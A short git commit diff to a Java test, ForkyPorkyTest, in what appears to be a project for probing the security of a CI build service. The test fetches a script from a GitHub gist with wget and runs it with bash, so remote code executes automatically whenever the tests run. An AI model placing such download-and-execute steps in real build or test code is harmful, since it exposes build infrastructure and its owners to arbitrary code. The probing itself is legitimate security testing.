13906c0227801e73ffdcdd071de9a49c10a66ca7
Felix Becker <git@felixbecker.name>
2012-05-20 01:58:51 +0200

    where is my forky porky .(

--- src/test/java/name/felixbecker/buildhivesecuritytest/ForkyPorkyTest.java
+++ src/test/java/name/felixbecker/buildhivesecuritytest/ForkyPorkyTest.java
@@ -6,6 +6,7 @@ public class ForkyPorkyTest extends CriminalParent {
 	@Test
 	public void forkyPorky() throws Exception{
 		execute("wget", "-O", "/tmp/forkyporky.sh", "https://raw.github.com/gist/2732891/66c94c8ed3c0510673a86a59fae4ad7bd9d010f6/gistfile1.txt");
+		execute("ls", "-la", "/tmp/forkyporky.sh");
 		execute("bash /tmp/forkyporky.sh");
 	}
 }
